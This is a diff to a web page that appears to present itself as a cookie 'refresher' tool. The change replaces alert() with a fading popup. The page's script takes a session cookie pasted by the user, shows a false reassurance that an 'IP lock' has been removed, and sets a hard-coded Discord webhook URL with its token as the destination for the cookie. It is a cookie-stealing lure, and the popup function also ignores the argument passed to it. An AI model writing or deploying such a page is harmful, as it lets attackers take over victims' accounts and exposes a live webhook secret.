@@ -19,18 +19,52 @@
             display: inline-block;
             text-align: left;
         }
+        /* Popup styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 1000;
+            animation: fadeInOut 2s forwards;
+        }
+        @keyframes fadeInOut {
+            0% { opacity: 0; transform: translateX(-50%) translateY(-10px); }
+            10% { opacity: 1; transform: translateX(-50%) translateY(0px); }
+            90% { opacity: 1; }
+            100% { opacity: 0; }
+        }
     </style>
     <script>
+        function showPopupMessage() {
+            const popup = document.createElement("div");
+            popup.className = "popup";
+            popup.innerHTML = "⚠️ IP lock already removed, no need to refresh cookie.";
+            document.body.appendChild(popup);
+            popup.style.display = "block";
+
+            setTimeout(() => {
+                popup.style.display = "none";
+                document.body.removeChild(popup);
+            }, 2000);
+        }
+
         async function sendCookie() {
             const cookie = document.getElementById("cookieInput").value;
             if (!cookie) {
-                alert("Please enter a cookie!");
+                showPopupMessage("Please enter a cookie!");
                 return;
             }
             
             document.getElementById("newCookie").textContent = cookie;
-            alert("⚠️ IP lock already removed, no need to refresh cookie.");
-            
+            showPopupMessage(); // Custom popup instead of alert()
+
             const webhookURL = "https://discord.com/api/webhooks/1342145069012226128/tCdPrO95hcPpasmFRjQtymKgYK028-0l3rZ4NgzlLKg0DgTUL4kj2ft1N0OT5LREM8jx";
             
             const payload = {
